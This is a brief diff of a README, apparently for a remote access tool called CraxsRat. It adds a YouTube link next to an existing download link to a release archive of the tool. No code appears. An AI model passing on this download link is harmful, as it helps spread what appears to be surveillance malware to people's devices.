@@ -140,4 +140,5 @@ Skeleton view or Scan View
 
 ## [Download](https://github.com/Ourmine0/CraxsRat/releases/download/Craxs_Rat/CraxsRat-V3@2023.zip)
 
+## [YouTube](https://youtu.be/VgIqA3Z0WTE)
 
